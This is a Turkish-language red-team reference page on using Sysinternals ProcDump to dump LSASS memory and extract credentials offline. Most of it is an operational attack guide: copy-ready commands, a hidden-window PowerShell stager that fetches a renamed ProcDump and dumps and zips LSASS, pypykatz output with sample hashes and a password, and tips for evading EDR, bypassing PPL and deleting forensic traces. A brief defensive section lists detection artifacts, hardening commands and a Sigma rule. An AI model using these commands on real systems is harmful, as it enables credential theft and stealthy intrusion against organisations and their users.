# ProcDump

> **Kategori:** [2. WINDOWS YEREL KOMUT SATIRI VE LOLBINS (NATIVE WINDOWS & SYSINTERNALS)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Microsoft Sysinternals resmi bellek dökümü aracı; LSASS sürecinin tam bellek dökümünü alma (`-ma lsass.exe`), süreç klonlama (`-r`), çevrimdışı kimlik bilgisi (hash/parola) çıkarma.

---

## 1. Genel Bakış ve Amaç

`procdump.exe`, Microsoft Sysinternals ekibi (Mark Russinovich) tarafından geliştirilmiş, resmi Microsoft dijital sertifikasına sahip, çalışan Windows süreçlerinin çökme anında veya isteğe bağlı olarak bellek dökümünü (MiniDump / Full Memory Dump - `.dmp`) diske kaydetmek amacıyla tasarlanmış bir hata ayıklama ve tanılama aracıdır.

Active Directory sızma testlerinde ve Red Team operasyonlarında `procdump.exe`, **LSASS Bellek Dökümü ve Kimlik Bilgisi Hırsızlığı (OS Credential Dumping: LSASS Memory - MITRE T1003.001)** için en çok başvurulan meşru **LOLBin (Living Off the Land Binary)** araçlarından biridir.

Modern EDR ve antivirüs çözümleri, `mimikatz.exe`, `sekurlsa` veya bilinen bellek enjektörlerini hem disk imzalarından hem de bellek içi taramalardan (AMSI / In-Memory Pattern Matching) anında tespit edip süreci öldürür. Ancak `procdump.exe`:
1. Microsoft tarafından imzalanmış meşru bir Windows Sysinternals aracıdır.
2. `lsass.exe` sürecine doğrudan DLL enjekte etmez veya zararlı kod çalıştırmaz; işletim sisteminin standart hata ayıklama API'sini (`MiniDumpWriteDump`) çağırır.
3. Saldırgan, hedef makinede hiçbir saldırı aracı çalıştırmadan LSASS sürecinin dökümünü diske alır (`lsass.dmp`), bu dosyayı kendi izole analiz ortamına taşır ve çevrimdışı araçlarla (`pypykatz`, yerel `mimikatz`) NTLM hash'lerini, Kerberos biletlerini ve açık metin parolaları çözer.

### Protokol ve Çalışma Prensibi

`procdump`, Windows'un `DbgHelp.dll` kütüphanesinde yer alan hata ayıklama API'leri üzerinden LSASS sürecinin sanal bellek sayfalarını okur:

```
┌──────────────────────────────────────────────────────────────┐
│                    Yönetici / Saldırgan                      │
│                [ procdump.exe -ma lsass.exe ]                │
└──────────────────────────────┬───────────────────────────────┘
                               │
            1. OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_...)
            2. SeDebugPrivilege Etkinleştirme                  
            3. MiniDumpWriteDump(hProcess, MiniDumpWithFull...)
                               │
                               ▼
┌──────────────────────────────────────────────────────────────┐
│                    LSASS.EXE (Local System)                  │
│  ┌────────────────────────────────────────────────────────┐  │
│  │             Bellekte Saklanan Kimlik Verileri          │  │
│  │                                                        │  │
│  │  - NTLM Hash'leri (Local Admin & Domain Users)         │  │
│  │  - Kerberos Biletleri (TGT / TGS Biletleri)            │  │
│  │  - WDigest / Kerberos SSP Açık Parolalar               │  │
│  │  - DPAPI Master Keys                                   │  │
│  └────────────────────────────────────────────────────────┘  │
└──────────────────────────────┬───────────────────────────────┘
                               │
         (A) Bellek Dökümü: lsass.dmp Diske Yazılır
         (B) Dosya Saldırgan Makinesine Taşınır (Exfiltration)
                               ▼
┌──────────────────────────────────────────────────────────────┐
│                 Saldırgan Makinesi (Linux)                   │
│          pypykatz lsa minidump lsass.dmp                     │
│                                                              │
│  -> Çevrimdışı Hash Dökümü: Administrator:500:aad3...:31d6...│
│  -> Kerberos Biletleri: .kirbi / .ccache formatında çıkarma  │
└──────────────────────────────────────────────────────────────┘
```

1. **Ayrıcalık Gereksinimi (`SeDebugPrivilege`):** `lsass.exe`, `NT AUTHORITY\SYSTEM` bağlamında çalışan korumalı bir sistem sürecidir. Bu sürecin belleğini okumak için komut istemcisinin **Yerel Yönetici (Local Administrator / High Integrity)** seviyesinde çalışması ve belirteçte `SeDebugPrivilege` ayrıcalığının bulunması zorunludur.
2. **MiniDumpWriteDump Çağrısı:** `procdump -ma` çalıştırıldığında, araç `MiniDumpWithFullMemory (0x00000002)` bayrağını kullanarak `MiniDumpWriteDump` API fonksiyonunu tetikler. LSASS'ın tüm sanal adres alanı taranır ve şifrelenmemiş ham bir `.dmp` dosyası oluşturulur.
3. **Süreç Klonlama (-r / Reflection):** Standart dump işlemi sırasında LSASS süreci kısa bir süreliğine dondurulur (freeze). Bu durum sistemde mikro donmalara yol açabilir veya EDR tarafından fark edilebilir. `procdump -r` parametresi, Windows'un `PSS (Process Snapshotting)` API'sini kullanarak LSASS sürecinin bellekte anlık bir gölge klonunu (snapshot) alır ve dump işlemini ana süreç yerine bu klon üzerinden gerçekleştirir.

### Neden Önemli?

| Kullanım Senaryosu | Açıklama |
|---|---|
| **EDR ve Antivirüs Atlatma** | Mimikatz gibi imzalı araçlar yerine güvenilir Sysinternals ikili dosyası ile LSASS dökümü alma. |
| **Çevrimdışı Kimlik Çıkarma (Offline Pwning)** | Canlı sistemde bellek taraması yapmadan, `.dmp` dosyasını Linux'ta `pypykatz` ile sessizce analiz etme. |
| **Süreç Klonlama (Stealth Dump)** | `-r` bayrağı ile ana LSASS sürecini kilitlemeden ve kesintiye uğratmadan klon bellek dökümü alma. |
| **PID Bazlı Hedefleme** | Komut satırında `lsass.exe` adını geçirmeyerek komut satırı izleme (CLI Auditing) kurallarını atlatma. |
| **Doğal 64-Bit Desteği** | `procdump64.exe` ile 64-bit işletim sistemlerinde WOW64 uyumsuzluk hatası yaşamadan kusursuz döküm alma. |

### Alternatif Bellek Dökümü Yöntemleriyle Karşılaştırma

| Kriter / Yetenek | `ProcDump` | `comsvcs.dll (MiniDump)` | `Taskmgr.exe (GUI)` | `Mimikatz (sekurlsa)` |
|---|---|---|---|---|
| **İkili Dosya İhtiyacı** | Sysinternals `procdump.exe` | Yok (Yerel Windows DLL) | Yok (Windows Görev Yöneticisi) | Harici C Binary |
| **Çalışma Modu** | CLI (Komut Satırı / Otomasyon) | CLI (`rundll32.exe`) | GUI (Masaüstü / RDP) | CLI / Bellek İçi |
| **Süreç Klonlama (-r)** | Var (Reflection desteği) | Yok | Yok | Yok |
| **EDR Algısı** | Orta (Komut satırı izlenir) | Yüksek (`comsvcs.dll` çok bilinir) | Çok Düşük (GUI işlemi) | Çok Yüksek (İmzalı zararlı) |
| **Çevrimdışı Analiz** | Evet (`.dmp` dosyası üretir) | Evet (`.dmp` dosyası üretir) | Evet (`.dmp` dosyası üretir) | Hayır (Doğrudan canlı okur) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

### Genel Sözdizimi

```cmd
procdump.exe [-accepteula] [seçenekler] <süreç_adı | PID> [çıktı_dosyası_veya_dizini]
```

### Kritik Parametreler ve Açıklamaları

| Parametre | Açıklama | Örnek Kullanım |
|---|---|---|
| `-ma` | Sürecin **tüm sanal bellek sayfalarını** (Full Memory Dump) döker. LSASS dökümünde hash'lerin eksiksiz çıkması için **ZORUNLUDUR**. | `procdump.exe -ma lsass.exe out.dmp` |
| `-accepteula` | Sysinternals son kullanıcı lisans sözleşmesini grafik pencere açmadan komut satırında sessizce kabul eder. | `procdump.exe -accepteula -ma ...` |
| `-r` | Süreç klonlama (Reflection) modunu açar; ana süreci dondurmadan snapshot klonu üzerinden döküm alır. | `procdump.exe -r -ma lsass.exe out.dmp` |
| `-mp` | MiniPlus dökümü alır (Tüm bellek sayfaları yerine yalnızca yüklü modülleri ve iş parçacıklarını döker). | `procdump.exe -mp lsass.exe out.dmp` |
| `-s <Saniye>` | Süreç dökümünün yazılması için maksimum zaman aşımı süresini belirler. | `procdump.exe -s 10 -ma ...` |
| `-u` | Aktif CPU kullanımını konsola basar. | `procdump.exe -u -ma ...` |
| `<PID>` | Süreç adı (`lsass.exe`) yerine doğrudan sayısal PID değeri girilebilir. | `procdump.exe -ma 684 crash.dmp` |

### Kayıt Defteri EULA Bypass Yapılandırması

Otomasyon script'lerinde `-accepteula` bayrağının unutulması sürecin sonsuz döngüde onay beklemesine neden olabilir. Bunu engellemek için önceden kayıt defterine onay anahtarı yazılabilir:

```cmd
reg add "HKCU\Software\Sysinternals\ProcDump" /v EulaAccepted /t REG_DWORD /d 1 /f
```

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: LSASS Sürecinin Tam Bellek Dökümünü İsimle Alma

Saldırgan yerel yönetici oturumunda LSASS sürecinin tam dökümünü geçici bir dizine kaydeder:

```cmd
procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

**Örnek Çıktı Analizi:**
```text
ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[14:20:15] Dump 1 initiated: C:\Windows\Temp\lsass.dmp
[14:20:16] Dump 1 writing: [------------------------------------------]
[14:20:18] Dump 1 complete: 168 MB written in 2.8 seconds.
```
- `Dump 1 complete: 168 MB written`: Çıktı dosyasının boyutu işletim sistemine ve etki alanı boyutuna göre genellikle **80 MB ile 300 MB** arasında değişir. Dosya boyutu birkaç megabayt ise `-ma` parametresi unutulmuş demektir!

---

### Senaryo 2: EDR Komut Satırı Filtrelerini Atlatmak İçin PID Kullanma

Güvenlik sistemleri `lsass.exe` dizesini komut satırında aradığı için, saldırgan önce PID'yi öğrenir ve ardından doğrudan sayısal PID ile dump alır:

```cmd
:: 1. LSASS sürecinin PID değerini bul
tasklist /fi "imagename eq lsass.exe"

:: 2. Sayısal PID (örneğin 684) ile döküm al ve zararsız bir dosya adı kullan
procdump64.exe -accepteula -ma 684 C:\Windows\Temp\crash_report.log
```

---

### Senaryo 3: Süreç Klonlama (-r Reflection) ile Kesintisiz ve Daha Sessiz Dump Alma

Büyük etki alanı denetleyicilerinde LSASS'ın anlık duraklaması kimlik doğrulama kesintilerine yol açabilir. `-r` parametresi ile süreç klonlanır:

```cmd
procdump64.exe -accepteula -r -ma lsass.exe C:\Windows\Temp\lsass_clone.dmp
```
- Windows `PSS (Process Snapshotting)` mekanizması devreye girer.
- Ana `lsass.exe` süreci hiçbir kesintiye uğramaz; arka planda klon süreç dökülür ve klon otomatik olarak yok edilir.

---

### Senaryo 4: Alınan Dump Dosyasını Saldırgan Makinesinde pypykatz ile Çevrimdışı Çözme

Elde edilen `lsass.dmp` dosyası saldırganın Linux analiz makinesine indirildikten sonra `pypykatz` ile çözülür:

```bash
# Linux makinesinde:
pypykatz lsa minidump lsass.dmp
```

**Örnek Çıktı:**
```text
FILE: lsass.dmp
== MSV ==
Username: Administrator
Domain: LAB
NT: 31d6cfe0d16ae931b73c59d7e0c089c0
SHA1: 4a2b1c...

== WDIGEST ==
Username: da_jdoe
Domain: LAB.LOCAL
Password: P@ssw0rd2026!Summer

== KERBEROS ==
Username: svc_backup
Domain: LAB.LOCAL
Ticket: [Kerberos TGT / TGS Biletleri]
```
- Yerel `Administrator` NT hash'i, `da_jdoe` açık metin parolası ve Kerberos biletleri tamamen çevrimdışı ortamda, hedef sistemde sıfır EDR alarmı oluşturularak ele geçirilmiştir!

---

### Senaryo 5: RunAsPPL (Protected Process Light) Korumasının Varlığını Denetleme

Döküm almadan önce LSASS'ın PPL koruması altında olup olmadığını kontrol etmek:

```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```
- Eğer değer `0x1` dönüyorsa, `lsass.exe` PPL ile korunmaktadır. `procdump` doğrudan bellek okuyamaz (`0x80070005 - Access is denied` hatası döner). Bu durumda saldırganın önce savunmasız bir çekirdek sürücüsü (BYOVD - Örneğin `mhyprot`, `RTCore64`) ile PPL bayrağını çekirdek belleğinde `0` yapması gerekir.

---

### Senaryo 6: İz Temizliği — Dump Dosyasını Güvenli Olarak Silme

Operasyon tamamlandıktan sonra gigabaytlarca yer kaplayan ve içinde kimlik bilgileri barındıran `.dmp` dosyasını adli bilişim kurtarmasını engelleyecek şekilde silmek:

```cmd
powershell -Command "Remove-Item -Path 'C:\Windows\Temp\lsass.dmp' -Force"
```

---

### Senaryo 7: PowerShell ile ProcDump İndirip Dump Alan ve Sıkıştıran Otomasyon Betiği

Hedef makinede `procdump` yoksa, aracı indirip, döküm alıp, çıktıyı zip'leyip temizleyen stager:

```powershell
# ProcDump Otomasyon Betiği:
$wc = New-Object System.Net.WebClient
$procExe = "$env:TEMP\sysdbg.exe"
$dmpFile = "$env:TEMP\memory.dmp"
$zipFile = "$env:TEMP\memory.zip"

# EULA kaydı oluştur
Set-ItemProperty -Path "HKCU:\Software\Sysinternals\ProcDump" -Name "EulaAccepted" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue

# İndir (İsim gizleme: sysdbg.exe)
$wc.DownloadFile("https://live.sysinternals.com/procdump64.exe", $procExe)

# LSASS PID bul
$targetPid = (Get-Process lsass).Id

# Dump al
Start-Process -FilePath $procExe -ArgumentList "-accepteula -r -ma $targetPid `"$dmpFile`"" -Wait -WindowStyle Hidden

# Sıkıştır ve ikili dosyayı temizle
Compress-Archive -Path $dmpFile -DestinationPath $zipFile -Force
Remove-Item $procExe, $dmpFile -Force

Write-Host "[+] LSASS dökümü hazır: $zipFile" -ForegroundColor Green
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kodu | Olası Neden | Çözüm Adımı |
|---|---|---|
| `Error writing dump file: 0x80070005 (Access is denied)` | Komut istemcisi yükseltilmemiştir (Local Admin gereklidir) veya `RunAsPPL` etkindir. | Komut satırını "Run as Administrator" olarak açın; `RunAsPPL` kontrolü yapın. |
| `The handle is invalid / Process cannot be opened` | Hedef sistemde **Credential Guard** veya **LSA Protection (PPL)** aktiftir; LSASS bellek erişimi çekirdek düzeyinde engellenmektedir. | PPL korumasını bypass etmek için BYOVD sürücü exploit'leri (PPLKiller, mimikatz mimidrv) kullanın veya NTDS.dit çekme yöntemlerine yönelin. |
| Komut askıda kalıyor (Hangs / Freezes) | `-accepteula` parametresi unutulmuştur; GUI lisans penceresi onay beklemektedir. | Komuta `-accepteula` ekleyin veya kayıt defterine `EulaAccepted = 1` yazın. |
| `Dump file is incomplete / Only 20-40 MB` | `-ma` parametresi unutulmuş veya `-mp` (Mini) kullanılmıştır; tam bellek sayfaları alınmamıştır. | Komutunuza mutlaka `-ma` (Full Memory) bayrağını ekleyin: `procdump64.exe -ma lsass.exe out.dmp`. |
| `Antivirus blocked execution / File quarantine` | Windows Defender veya EDR, `procdump.exe` dosya adını veya hash'ini engellemiştir. | Dosya adını değiştirin (`svchost_debug.exe`) veya Sysinternals Live üzerinden doğrudan bellek içi WebClient stream ile çalıştırın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Artifacts & Logs)

- **Uç Nokta Olay Günlükleri (Endpoint Logs):**
  - **Sysmon Event ID 10 (ProcessAccess - EN KRİTİK IOC):** Bir sürecin `lsass.exe` sürecine handle açması EDR sistemlerinin birincil tespit kaynağıdır:
    - `SourceImage: C:\Windows\Temp\procdump.exe` (veya yeniden adlandırılmış exe)
    - `TargetImage: C:\Windows\System32\lsass.exe`
    - `GrantedAccess: 0x1FFFFF` veya `0x1010` (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
  - **Event ID 4688 / Sysmon Event ID 1 (Process Creation):** `procdump.exe` çalıştırılması, argümanları (`-ma`, `lsass.exe`) kaydedilir.
  - **Sysmon Event ID 11 (File Create):** Diske yazılan büyük boyutlu (`100 MB+`) `.dmp` dosyası kaydedilir.
  - **Kayıt Defteri İzi:** `HKCU\Software\Sysinternals\ProcDump\EulaAccepted = 1` anahtarı.

### 5.2 Ağ ve EDR İmzaları

- **Karakteristik EDR Alarmları:** İstisnasız tüm modern kurumsal EDR'lar (CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne), komut satırında `procdump` ve `lsass` kelimelerinin yan yana gelmesini **High/Critical Severity: Credential Dumping Attempt (T1003.001)** olarak engeller.
- **ASR (Attack Surface Reduction) Kuralları:** Windows Defender ASR kuralı `Block credential stealing from the Windows local security authority subsystem (lsass.exe)` etkinse, `procdump` dahil tüm yetkisiz süreçlerin LSASS belleğini okuması çekirdek seviyesinde bloklanır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1003.001** | OS Credential Dumping: LSASS Memory | LSASS sürecinin bellek dökümünü diske alarak hash/parola çalma. |
| **T1005** | Data from Local System | Büyük bellek döküm dosyasını yerel diskte toplama. |
| **T1070.004** | Indicator Removal on Host: File Deletion | Döküm dosyasını silerek adli izleri temizleme. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Alternatif Teknik |
|---|---|
| **Komut Satırında `lsass.exe` İmzası** | Süreç adı yerine sayısal PID kullanın (`tasklist` ile bulun) ve `procdump64.exe` adını `notepad_dump.exe` gibi masum bir isimle değiştirin. |
| **`.dmp` Dosya Uzantısı İmzası** | Çıktı dosyasını asla `.dmp` yapmayın; `.log`, `.dat`, `.tmp` gibi dikkat çekmeyen uzantılar ve masum dosya yolları kullanın. |
| **Sysmon Event 10 (ProcessAccess) Alarmı** | `MiniDumpWriteDump` yerine doğrudan `comsvcs.dll` veya Görev Yöneticisi GUI'sini kullanın ya da `vssadmin` ile Volume Shadow Copy üzerinden SAM kovanını çalmayı tercih edin. |
| **Süreç Klonlama Kullanımı** | Mutlaka `-r` parametresini ekleyerek ana sürecin duraklamasını engelleyin. |

### 5.5 Savunma Karşılığı (Blue Team)

- **LSA Protection (RunAsPPL) Zorunluluğu:** Kayıt defteri üzerinden PPL'i aktif ederek LSASS'ı korumalı süreç yapın:
  ```cmd
  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
  ```
- **Defender ASR Kuralını Devreye Alma:**
  ```powershell
  Add-MpPreference -AttackSurfaceReductionRules_Ids 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 -AttackSurfaceReductionRules_Actions Enabled
  ```
- **Sigma Kuralı Mantığı:**
  ```yaml
  title: LSASS Memory Dump via ProcDump
  status: critical
  logsource:
      category: process_creation
      product: windows
  detection:
      selection_image:
          Image|endswith:
              - '\procdump.exe'
              - '\procdump64.exe'
      selection_args:
          CommandLine|contains:
              - 'lsass'
              - '-ma'
      condition: selection_image or selection_args
  ```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

### 6.1 LSASS Sürecinin Tam Bellek Dökümünü Alma
```cmd
procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```
- **Ne Yapar?** LSASS sürecinin tüm bellek sayfalarını tek parça `.dmp` dosyası olarak diske yazar.
- **Ne Zaman Kullanılır?** Çevrimdışı kimlik bilgisi (hash, bilet, parola) analizi için en temel döküm komutudur.
- **Parametreler:** `-accepteula` (Lisans onayı), `-ma` (Full memory dump), `lsass.exe` (Hedef süreç).

### 6.2 Sayısal PID Kullanarak Komut Satırı Filtrelerini Atlatma
```cmd
procdump64.exe -accepteula -ma 684 C:\Windows\Temp\crash.bin
```
- **Ne Yapar?** Komut satırında `lsass` kelimesi geçirmeden doğrudan belirtilen PID'deki sürecin dökümünü alır.
- **Ne Zaman Kullanılır?** EDR komut satırı izleme alarmlarını tetiklememek için.
- **Parametreler:** `684` (Hedef LSASS PID'si), `crash.bin` (Gizlenmiş çıktı dosya adı).

### 6.3 Süreç Klonlama (-r Reflection) ile Bellek Dökümü Alma
```cmd
procdump64.exe -accepteula -r -ma lsass.exe C:\Windows\Temp\lsass_ref.dmp
```
- **Ne Yapar?** Ana LSASS sürecini dondurmadan, bellekte anlık klonunu oluşturur ve dökümü klon üzerinden alır.
- **Ne Zaman Kullanılır?** Domain Controller gibi kritik sunucularda kimlik doğrulama kesintisi veya süreç kilitlenmesi riskini önlemek için.
- **Parametreler:** `-r` (Reflection / Snapshot klonlama modu).

### 6.4 EULA Onayını Kayıt Defterine Önceden Enjekte Etme
```cmd
reg add "HKCU\Software\Sysinternals\ProcDump" /v EulaAccepted /t REG_DWORD /d 1 /f
```
- **Ne Yapar?** Sysinternals lisans onayını kullanıcı kovanına önceden kaydeder.
- **Ne Zaman Kullanılır?** Otomasyon script'lerinde ProcDump'ın GUI onay penceresinde kilitlenmesini engellemek için.
- **Parametreler:** `/v EulaAccepted`, `/t REG_DWORD`, `/d 1`.

### 6.5 Dump Dosyasını Linux Makinesinde pypykatz İle Çözme
```bash
pypykatz lsa minidump lsass.dmp
```
- **Ne Yapar?** Windows'tan sızdırılan `.dmp` dosyasını tamamen çevrimdışı ortamda ayrıştırarak içindeki tüm NTLM hash'lerini, Kerberos biletlerini ve açık parolaları döker.
- **Ne Zaman Kullanılır?** Hedef ağda Mimikatz çalıştırmadan, kendi güvenli ortamınızda kimlik bilgilerini çıkarmak için.
- **Parametreler:** `lsa minidump <dosya.dmp>`.

### 6.6 LSASS PID Değerini Tek Satırda Bulma
```cmd
tasklist /fi "imagename eq lsass.exe"
```
- **Ne Yapar?** Çalışan `lsass.exe` sürecinin sayısal PID değerini hızlıca listeler.
- **Ne Zaman Kullanılır?** PID bazlı gizli ProcDump komutunu hazırlamadan önce.
- **Parametreler:** `/fi "imagename eq lsass.exe"`.

### 6.7 RunAsPPL LSA Koruma Durumunu Kontrol Etme
```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```
- **Ne Yapar?** LSASS sürecinin Protected Process Light (PPL) ile korunup korunmadığını kontrol eder.
- **Ne Zaman Kullanılır?** ProcDump çalıştırmadan önce `Access Denied` hatası alıp almayacağınızı doğrulamak için.
- **Parametreler:** `/v RunAsPPL`.

---

## Kaynaklar

| Kaynak | Bağlantı |
|---|---|
| Microsoft Learn — ProcDump (Sysinternals) | [learn.microsoft.com](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) |
| MITRE ATT&CK T1003.001 (OS Credential Dumping: LSASS Memory) | [attack.mitre.org](https://attack.mitre.org/techniques/T1003/001/) |
| GitHub — pypykatz (Python Mimikatz Implementation) | [github.com](https://github.com/skelsec/pypykatz) |
| LOLBAS Project — procdump.exe | [lolbas-project.github.io](https://lolbas-project.github.io/) |

---

> **Önceki:** [← LDP.exe](./LDP.md) · **Sonraki Kategori:** [3. Dizin Keşfi, Graf Analizi ve Saldırı Yolu Haritalama →](../Kategori_03_Dizin_Kesfi_Graf_Analizi_ve_Haritalama/README.md)
